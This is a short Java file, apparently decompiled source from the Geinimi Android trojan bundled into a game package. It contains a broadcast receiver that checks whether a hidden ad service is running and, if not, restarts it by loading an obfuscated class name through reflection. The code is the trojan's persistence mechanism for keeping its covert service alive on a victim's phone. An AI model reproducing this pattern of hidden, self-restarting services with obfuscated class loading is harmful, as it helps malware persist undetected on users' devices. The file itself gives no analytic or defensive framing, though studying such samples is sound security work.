package com.geinimi;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.sumsharp.monster.common.Tool;

public class AdServiceReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        if (!AdActivity.isRunningServices(context)) {
            Class<?> cls = null;
            try {
                cls = Class.forName(AdService.f());
            } catch (Exception e) {
            }
            if (cls != null) {
                Intent intent2 = new Intent(context, cls);
                intent2.addFlags(Tool.FILL_VERYDARK);
                context.startService(intent2);
            }
        }
    }
}
